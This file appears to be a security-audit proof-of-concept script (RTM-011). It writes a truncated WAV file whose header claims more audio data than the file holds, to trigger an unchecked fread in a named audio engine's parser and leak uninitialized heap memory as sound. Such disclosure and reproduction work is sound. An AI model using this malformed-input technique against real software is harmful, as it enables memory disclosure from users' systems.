#!/usr/bin/env python3
"""
RTM-011 PoC: MetronomeEngine WAV parser unchecked fread (uninitialized memory)
Severity: Medium
File: AestraAudio/src/Playback/MetronomeEngine.cpp lines 122, 132

The MetronomeEngine WAV parser allocates a buffer based on numSamples
from the file header, then calls fread() without checking the return value.
If the file is truncated (header claims more data than the file contains),
the remainder of the buffer contains uninitialized heap memory.
This memory is then converted to audio samples and played — leaking
prior heap contents through audible output.
"""

import struct
import sys
import os

def create_truncated_wav(output_path):
    """
    Create a deliberately malformed WAV file whose header advertises more audio data than is actually written.
    
    This writes a RIFF/WAVE file containing 16-bit PCM, mono, 44100 Hz audio where the `data` chunk claims 1000 samples (2000 bytes) but the file contains only 50 samples (100 bytes). The discrepancy is intended to reproduce an unchecked fread/uninitialized-memory condition in WAV parsers that allocate buffers based on the header and read the claimed byte count without validating the actual file length.
    
    Parameters:
        output_path (str): Filesystem path where the WAV file will be created. Parent directories will be created if needed.
    """
    os.makedirs(os.path.dirname(output_path) if os.path.dirname(output_path) else ".", exist_ok=True)

    with open(output_path, "wb") as f:
        # RIFF header
        f.write(b"RIFF")
        file_size_placeholder = 0  # Will be overwritten
        f.write(struct.pack("<I", 0))  # Placeholder
        f.write(b"WAVE")

        # fmt chunk
        f.write(b"fmt ")
        f.write(struct.pack("<I", 16))  # Chunk size
        f.write(struct.pack("<H", 1))   # Audio format (PCM)
        f.write(struct.pack("<H", 1))   # numChannels (mono)
        f.write(struct.pack("<I", 44100))  # Sample rate
        f.write(struct.pack("<I", 88200))  # Byte rate (44100 * 2)
        f.write(struct.pack("<H", 2))   # Block align
        f.write(struct.pack("<H", 16))  # bitsPerSample (16-bit)

        # data chunk — claim 1000 samples worth of data
        claimed_samples = 1000
        claimed_bytes = claimed_samples * 2  # 16-bit = 2 bytes per sample
        f.write(b"data")
        f.write(struct.pack("<I", claimed_bytes))  # Claims 2000 bytes

        # But only write 50 samples (100 bytes)
        actual_samples = 50
        actual_data = struct.pack("<" + "h" * actual_samples, *range(actual_samples))
        f.write(actual_data)

        # File is now 144 bytes total but claims 2000 bytes of audio data
        file_size = f.tell()
        f.seek(4)
        f.write(struct.pack("<I", file_size - 8))

    size = os.path.getsize(output_path)
    print(f"[+] PoC: {output_path} ({size} bytes)")
    print(f"[+] Header claims {claimed_samples} samples ({claimed_bytes} bytes)")
    print(f"[+] File contains only {actual_samples} samples ({len(actual_data)} bytes)")
    print(f"[+] fread() reads {claimed_bytes} bytes but file only has {len(actual_data)}")
    print(f"[+] Return value NOT checked → {claimed_samples - actual_samples} samples are uninitialized heap memory")
    print(f"[+] Line 122: fread(rawData.data(), 2, numSamples * numChannels, file);")
    print(f"[+] Line 132: fread(rawData.data(), 1, numSamples * numChannels * 3, file); (24-bit path)")
    print(f"[+] Impact: Uninitialized memory played as audio (info leak via sound)")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <output.wav>")
        sys.exit(1)
    create_truncated_wav(sys.argv[1])
